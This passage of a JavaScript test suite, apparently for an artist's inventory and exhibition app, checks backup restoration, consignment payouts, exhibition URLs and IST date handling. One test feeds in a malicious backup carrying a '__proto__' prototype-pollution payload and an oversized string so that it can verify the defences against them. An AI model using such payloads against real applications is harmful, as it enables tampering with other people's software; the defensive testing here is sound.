it('59. StorageService Backup Restoration Hardening: Defend against prototype pollution, oversized files, and invalid profile fields', () => {
  // A. Rejection of oversized backup JSON (>10MB)
  const hugePayload = '{"data":"' + 'A'.repeat(11 * 1024 * 1024) + '"}';
  const oversizedRes = StorageService.restoreBackupJson(hugePayload);
  assert.equal(oversizedRes.success, false);
  assert.ok(oversizedRes.error?.includes('exceeds maximum allowable size'));

  // B. Prototype pollution defense & profile sanitization
  const maliciousBackup = JSON.stringify({
    workspace: {
      profile: {
        __proto__: { polluted: true },
        artistName: '  Legitimate Artist Name  ',
        baseCurrency: 'INVALID_CURRENCY_HACK',
        hourlyRate: -500, // Negative rate
        defaultMarkupPercent: 999, // >100%
      },
      inventory: [
        { id: 'art-1', title: 'Real Artwork' },
        null, // Non-object element in array
        'string-instead-of-object'
      ]
    }
  });

  const res = StorageService.restoreBackupJson(maliciousBackup);
  assert.equal(res.success, true);
  assert.ok(res.restoredState);
  
  // Check profile fields safely normalized
  assert.equal(res.restoredState.profile.artistName, 'Legitimate Artist Name');
  assert.equal(res.restoredState.profile.baseCurrency, 'USD', 'Invalid currency must fall back to default USD');
  assert.equal(res.restoredState.profile.hourlyRate, 65, 'Negative hourly rate must fall back to default');
  assert.equal(res.restoredState.profile.defaultMarkupPercent, 50, 'Out-of-range markup must fall back to default');
  
  // Check non-objects filtered from collections
  assert.equal(res.restoredState.inventory.length, 1);
  assert.equal(res.restoredState.inventory[0].id, 'art-1');
  
  // Ensure Object prototype was never polluted
  assert.equal(({}).polluted, undefined);
});

// 60. Financial Engine Correctness: Consignment sales net receivable balance due and cash recognition
it('60. Financial Engine Correctness: Consignment sales net receivable balance due and cash recognition', () => {
  const gross = 10000;
  const discount = 0;
  const netSellingPrice = gross - discount; // 10000
  const commissionRate = 40; // 40%
  const commissionAmount = Math.round((netSellingPrice * commissionRate) / 100); // 4000
  const shippingDeduction = 500;
  const otherExpenses = 0;
  const calculatedNet = Math.max(0, netSellingPrice - commissionAmount - shippingDeduction - otherExpenses); // 5500

  // Case 1: Sale is 'Paid'
  const paidAmountReceived = calculatedNet; // 5500
  const paidBalanceDue = 0;
  assert.equal(paidAmountReceived, 5500, 'Artist received cash must equal net proceeds, not gross');
  assert.equal(paidBalanceDue, 0);

  // Case 2: Sale is 'Pending'
  const pendingAmountReceived = 0;
  const pendingBalanceDue = calculatedNet; // 5500
  assert.equal(pendingBalanceDue, 5500, 'Pending balance due must equal artist net receivable (5500), not gross customer price');

  // Case 3: Sale is 'Partially Paid' (e.g. 2000 deposit received by artist)
  const depositReceived = 2000;
  const partialBalanceDue = Math.max(0, calculatedNet - depositReceived); // 3500
  assert.equal(partialBalanceDue, 3500, 'Partial balance due must reflect remaining net proceeds');
});

// 61. Exhibition Live URL & Canonical Slug Verification
it('61. Exhibition Live URL & Canonical Slug Verification across all feed events', () => {
  const eventsData = JSON.parse(fs.readFileSync(path.join(rootDir, 'public/data/events.json'), 'utf8'));
  const events = eventsData.events;
  assert.ok(events.length >= 17, 'Should have at least 17 events');

  for (const e of events) {
    assert.ok(isValidUrl(e.officialUrl), `Event ${e.id} must have valid officialUrl: ${e.officialUrl}`);
    assert.ok(e.officialUrl.startsWith('https://'), `Event ${e.id} officialUrl must use HTTPS: ${e.officialUrl}`);
    assert.ok(!e.officialUrl.includes('/#'), `Event ${e.id} officialUrl must not end in hash: ${e.officialUrl}`);
    assert.ok(!e.officialUrl.includes('example.com'), `Event ${e.id} officialUrl must not be example: ${e.officialUrl}`);

    if (e.bookingUrl) {
      assert.ok(isValidUrl(e.bookingUrl), `Event ${e.id} bookingUrl must be valid: ${e.bookingUrl}`);
      assert.ok(e.bookingUrl.startsWith('https://'), `Event ${e.id} bookingUrl must use HTTPS`);
    }
  }

  // Explicit regression checks for prompt target exhibitions
  const chemould = events.find(e => e.id === 'evt-chemould-reena-kallat');
  assert.ok(chemould, 'Chemould event must exist');
  assert.equal(chemould.officialUrl, 'https://www.gallerychemould.com/exhibitions/165-spectral-frequencies-reena-saini-kallat/');

  const p88 = events.find(e => e.id === 'evt-project88-sarnath-banerjee');
  assert.ok(p88, 'Project 88 event must exist');
  assert.equal(p88.officialUrl, 'https://www.project88.in/exhibitions/129-badly-remembered-things-sarnath-banerjee/overview/');

  const tao = events.find(e => e.id === 'evt-tao-kalpana-shah');
  assert.ok(tao, 'Tao event must exist');
  assert.equal(tao.officialUrl, 'https://www.taoartgallery.com/pages/current');

  const akara = events.find(e => e.id === 'evt-akara-from-line-to-landscape');
  assert.ok(akara, 'Akara event must exist');
  assert.equal(akara.officialUrl, 'https://akaraart.com/exhibition/details/from-line-to-landscape:-works-on-paper');

  const jnaf = events.find(e => e.id === 'evt-jnaf-jyoti-bhatt');
  assert.ok(jnaf, 'JNAF event must exist');
  assert.equal(jnaf.officialUrl, 'https://jnaf.org/exhibition/jyoti-bhatt-the-looking-glass/');

  const nmacc = events.find(e => e.id === 'evt-nmacc-superblue');
  assert.ok(nmacc, 'NMACC event must exist');
  assert.equal(nmacc.officialUrl, 'https://www.nmacc.com/visual-arts/second-nature/');
  assert.equal(nmacc.startDate, '2026-07-03');

  const tateJulio = events.find(e => e.id === 'evt-tate-julio-le-parc');
  assert.ok(tateJulio, 'Tate Julio event must exist');
  assert.equal(tateJulio.officialUrl, 'https://www.tate.org.uk/whats-on/tate-modern/julio-le-parc');

  const tateBell = events.find(e => e.id === 'evt-tate-bloomsbury');
  assert.ok(tateBell, 'Tate Bloomsbury event must exist');
  assert.equal(tateBell.officialUrl, 'https://www.tate.org.uk/whats-on/tate-britain/vanessa-bell-and-duncan-grant');
});

// 62. Zero-Shift Date-Only Calendar Parsing (formatDateOnly)
it('62. Zero-Shift Date-Only Calendar Parsing across simulated client timezones', () => {
  // Typical date strings
  assert.equal(formatDateOnly('2026-11-30'), '30 Nov 2026');
  assert.equal(formatDateOnly('2026-11-30', { month: 'long' }), '30 November 2026');
  assert.equal(formatDateOnly('2026-01-01'), '1 Jan 2026');
  assert.equal(formatDateOnly('2026-12-31'), '31 Dec 2026');

  // Leap year check
  assert.equal(formatDateOnly('2028-02-29'), '29 Feb 2028');

  // Multi-day date range without shifting
  const range1 = formatDateRange('2026-10-24', '2026-11-21');
  assert.equal(range1, '24 Oct – 21 Nov 2026');

  const rangeSameMonth = formatDateRange('2026-10-10', '2026-10-31');
  assert.equal(rangeSameMonth, '10–31 Oct 2026');

  const rangeSameDay = formatDateRange('2026-10-25', '2026-10-25');
  assert.equal(rangeSameDay, '25 Oct 2026');

  const rangeMultiYear = formatDateRange('2026-11-28', '2027-01-01');
  assert.equal(rangeMultiYear, '28 Nov 2026 – 1 Jan 2027');
});

// 63. Indian Standard Time (IST, Asia/Kolkata) Formatting
it('63. Indian Standard Time (IST, Asia/Kolkata) Formatting and Zone Labeling', () => {
  assert.equal(IST_TIMEZONE, 'Asia/Kolkata');

  // UTC instant to IST: 2026-10-25 09:20:00 UTC = 2026-10-25 14:50:00 IST (+5:30)
  const utcInstant = '2026-10-25T09:20:00.000Z';
  const istFormatted = formatInstantToIST(utcInstant);
  assert.ok(istFormatted.includes('25 Oct 2026'), `Should contain date, got ${istFormatted}`);
  assert.ok(istFormatted.includes('02:50') || istFormatted.includes('2:50'), `Should contain 2:50, got ${istFormatted}`);
  assert.ok(istFormatted.endsWith('IST'), `Should append IST, got ${istFormatted}`);

  // Midnight UTC boundary: 2026-10-25 00:00:00 UTC = 2026-10-25 05:30:00 IST
  const midnightUtc = '2026-10-25T00:00:00.000Z';
  const istMidnight = formatInstantToIST(midnightUtc);
  assert.ok(istMidnight.includes('05:30') || istMidnight.includes('5:30'));
  assert.ok(istMidnight.includes('am') || istMidnight.includes('AM'));
  assert.ok(istMidnight.endsWith('IST'));

  // Without time
  const dateOnlyIst = formatInstantToIST(utcInstant, { includeTime: false });
  assert.equal(dateOnlyIst, '25 Oct 2026');
});

// 64. Venue Local Time Preservation & International Exhibition Timezones
it('64. Venue Local Time Preservation & International Exhibition Timezones', () => {
  // London BST instant: 2026-10-15 12:00:00 UTC = 13:00 BST (Europe/London), 17:30 IST
  const londonInstant = '2026-10-15T12:00:00.000Z';
  const venueFormatted = formatVenueDateTime(londonInstant, 'Europe/London', { includeIST: true });
  assert.ok(venueFormatted.includes('BST') || venueFormatted.includes('1:00') || venueFormatted.includes('13:00'));
  assert.ok(venueFormatted.includes('IST'));

  // Date range with non-IST venue timezone annotation
  const tateRange = formatDateRange('2026-10-01', '2027-05-03', '10:00 AM – 6:00 PM', 'Europe/London');
  assert.ok(tateRange.includes('London time'), `Should include London time annotation, got: ${tateRange}`);
});

// 65. Event Closing Boundary & Strict Past Status Protection
it('65. Event Closing Boundary & Strict Past Status Protection', () => {
  const testEvent = {
    startDate: '2026-10-01',
    endDate: '2026-10-25',
    eventStatus: 'happening-now',
    timezone: 'Asia/Kolkata'
  };

  // During exhibition run in IST (e.g. Oct 15, 2026 noon IST)
  const midRunMs = parseDateInTimezone('2026-10-15', 'Asia/Kolkata', false);
  assert.equal(calculateEventStatus(testEvent, midRunMs), 'happening-now');

  // Final day before closing (Oct 25, 2026 23:59:50 IST = 18:29:50 UTC)
  const lastSecondMs = parseDateInTimezone('2026-10-25', 'Asia/Kolkata', true) - 1000;
  assert.equal(calculateEventStatus(testEvent, lastSecondMs), 'happening-now');

  // Immediately after closing boundary (Oct 26, 2026 00:00:01 IST = 18:30:01 UTC Oct 25)
  const expiredMs = parseDateInTimezone('2026-10-25', 'Asia/Kolkata', true) + 2000;
  const expiredStatus = calculateEventStatus(testEvent, expiredMs);
  assert.equal(expiredStatus, 'past', 'Ended exhibition must strictly be categorized as past');
  assert.notEqual(expiredStatus, 'happening-now', 'Ended exhibition must NEVER return happening-now');

  // Before opening (Sept 30, 2026)
  const beforeOpeningMs = parseDateInTimezone('2026-09-30', 'Asia/Kolkata', false);
  assert.equal(calculateEventStatus(testEvent, beforeOpeningMs), 'upcoming');
});

// 66. Application Deadline Countdown Arithmetic (IST End-of-Day Boundary)
it('66. Application Deadline Countdown Arithmetic (IST End-of-Day Boundary)', () => {
  const deadlineDate = '2026-11-30';

  // 1. Closes today: simulated now is Nov 30, 2026 10:00 AM IST
  const noonDeadlineDayMs = parseDateInTimezone('2026-11-30', 'Asia/Kolkata', false) + 10 * 3600 * 1000;
  const todayRes = getDaysRemainingIST(deadlineDate, noonDeadlineDayMs);
  assert.equal(todayRes.text, 'Closes today');
  assert.equal(todayRes.closesToday, true);
  assert.equal(todayRes.isPast, false);

  // 2. 1 day remaining: simulated now is Nov 29, 2026 10:00 AM IST
  const dayBeforeMs = parseDateInTimezone('2026-11-29', 'Asia/Kolkata', false) + 10 * 3600 * 1000;
  const oneDayRes = getDaysRemainingIST(deadlineDate, dayBeforeMs);
  assert.equal(oneDayRes.text, '1 day remaining');
  assert.equal(oneDayRes.days, 1);
  assert.equal(oneDayRes.isPast, false);

  // 3. 5 days remaining: simulated now is Nov 25, 2026 10:00 AM IST
  const fiveDaysBeforeMs = parseDateInTimezone('2026-11-25', 'Asia/Kolkata', false) + 10 * 3600 * 1000;
  const fiveDaysRes = getDaysRemainingIST(deadlineDate, fiveDaysBeforeMs);
  assert.equal(fiveDaysRes.text, '5 days remaining');
  assert.equal(fiveDaysRes.days, 5);
  assert.equal(fiveDaysRes.isPast, false);

  // 4. Past deadline: simulated now is Dec 1, 2026 01:00 AM IST
  const pastDeadlineMs = parseDateInTimezone('2026-12-01', 'Asia/Kolkata', false) + 3600 * 1000;
  const pastRes = getDaysRemainingIST(deadlineDate, pastDeadlineMs);
  assert.equal(pastRes.text, 'Deadline passed');
  assert.equal(pastRes.isPast, true);
});



console.log(`\nData Integrity & Adversarial Tests: ${passed} PASSED, ${failed} FAILED\n`);
if (failed > 0) process.exit(1);
